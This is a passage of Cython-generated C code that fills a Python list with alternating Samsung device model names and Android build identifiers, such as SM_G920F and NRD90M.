  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 164, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 165, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 166, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NMF2);
  __Pyx_GIVEREF(__pyx_n_s_NMF2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 167, __pyx_n_s_NMF2)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T705);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T705);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 168, __pyx_kp_s_SM_T705)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 169, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G920F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G920F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 170, __pyx_kp_s_SM_G920F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 171, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N5100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 172, __pyx_kp_s_GT_N5100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JZO54K);
  __Pyx_GIVEREF(__pyx_n_s_JZO54K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 173, __pyx_n_s_JZO54K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300I);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 174, __pyx_kp_s_GT_I9300I)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KTU84P);
  __Pyx_GIVEREF(__pyx_n_s_KTU84P);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 175, __pyx_n_s_KTU84P)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300I);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 176, __pyx_kp_s_GT_I9300I)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KTU84P);
  __Pyx_GIVEREF(__pyx_n_s_KTU84P);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 177, __pyx_n_s_KTU84P)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 178, __pyx_kp_s_GT_N8000)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 179, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 180, __pyx_kp_s_GT_N8000)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 181, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 182, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 183, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9190);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9190);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 184, __pyx_kp_s_GT_I9190)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 185, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 186, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NMF26X);
  __Pyx_GIVEREF(__pyx_n_s_NMF26X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 187, __pyx_n_s_NMF26X)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 188, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 189, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P5100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 190, __pyx_kp_s_GT_P5100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JDQ39);
  __Pyx_GIVEREF(__pyx_n_s_JDQ39);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 191, __pyx_n_s_JDQ39)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300I);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 192, __pyx_kp_s_GT_I9300I)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KTU84P);
  __Pyx_GIVEREF(__pyx_n_s_KTU84P);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 193, __pyx_n_s_KTU84P)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N5100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 194, __pyx_kp_s_GT_N5100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JZO54K);
  __Pyx_GIVEREF(__pyx_n_s_JZO54K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 195, __pyx_n_s_JZO54K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 196, __pyx_kp_s_GT_N8000)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 197, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9500);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 198, __pyx_kp_s_GT_I9500)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22C);
  __Pyx_GIVEREF(__pyx_n_s_LRX22C);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 199, __pyx_n_s_LRX22C)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 200, __pyx_kp_s_SM_J320FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 201, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 202, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 203, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 204, __pyx_kp_s_GT_N8000)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JZO54K);
  __Pyx_GIVEREF(__pyx_n_s_JZO54K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 205, __pyx_n_s_JZO54K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T805);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T805);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 206, __pyx_kp_s_SM_T805)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 207, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T231);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T231);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 208, __pyx_kp_s_SM_T231)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 209, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N5100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 210, __pyx_kp_s_GT_N5100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JZO54K);
  __Pyx_GIVEREF(__pyx_n_s_JZO54K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 211, __pyx_n_s_JZO54K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 212, __pyx_kp_s_SM_J320H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 213, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T231);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T231);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 214, __pyx_kp_s_SM_T231)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 215, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G930F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G930F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 216, __pyx_kp_s_SM_G930F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 217, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G935F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G935F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 218, __pyx_kp_s_SM_G935F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 219, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T310);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T310);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 220, __pyx_kp_s_SM_T310)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 221, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 222, __pyx_kp_s_GT_N8000)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 223, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300I);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 224, __pyx_kp_s_GT_I9300I)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KTU84P);
  __Pyx_GIVEREF(__pyx_n_s_KTU84P);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 225, __pyx_n_s_KTU84P)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G920F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G920F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 226, __pyx_kp_s_SM_G920F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 227, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 228, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NMF26X);
  __Pyx_GIVEREF(__pyx_n_s_NMF26X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 229, __pyx_n_s_NMF26X)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T705);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T705);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 230, __pyx_kp_s_SM_T705)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_LRX22G_2);
  __Pyx_GIVEREF(__pyx_kp_s_LRX22G_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 231, __pyx_kp_s_LRX22G_2)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P3110);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P3110);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 232, __pyx_kp_s_GT_P3110)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JZO54K);
  __Pyx_GIVEREF(__pyx_n_s_JZO54K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 233, __pyx_n_s_JZO54K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9192);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9192);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 234, __pyx_kp_s_GT_I9192)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 235, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 236, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 237, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G920F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G920F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 238, __pyx_kp_s_SM_G920F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 239, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 240, __pyx_kp_s_GT_I9300)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_IMM76D);
  __Pyx_GIVEREF(__pyx_n_s_IMM76D);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 241, __pyx_n_s_IMM76D)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G950F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G950F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 242, __pyx_kp_s_SM_G950F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 243, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 244, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 245, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 246, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_NMF26X_2);
  __Pyx_GIVEREF(__pyx_kp_s_NMF26X_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 247, __pyx_kp_s_NMF26X_2)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J701F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J701F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 248, __pyx_kp_s_SM_J701F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 249, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 250, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 251, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T231);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T231);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 252, __pyx_kp_s_SM_T231)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 253, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T311);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T311);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 254, __pyx_kp_s_SM_T311)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 255, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 256, __pyx_kp_s_SM_J320FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 257, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P5210);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5210);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 258, __pyx_kp_s_GT_P5210)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 259, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T805);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T805);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 260, __pyx_kp_s_SM_T805)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 261, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9500);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 262, __pyx_kp_s_GT_I9500)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22C);
  __Pyx_GIVEREF(__pyx_n_s_LRX22C);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 263, __pyx_n_s_LRX22C)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P5200);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5200);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 264, __pyx_kp_s_GT_P5200)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 265, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9301I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9301I);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 266, __pyx_kp_s_GT_I9301I)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 267, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 268, __pyx_kp_s_GT_I9300)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JSS15J);
  __Pyx_GIVEREF(__pyx_n_s_JSS15J);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 269, __pyx_n_s_JSS15J)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 270, __pyx_kp_s_GT_N7100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 271, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T531);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 272, __pyx_kp_s_SM_T531)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 273, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T820);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T820);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 274, __pyx_kp_s_SM_T820)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
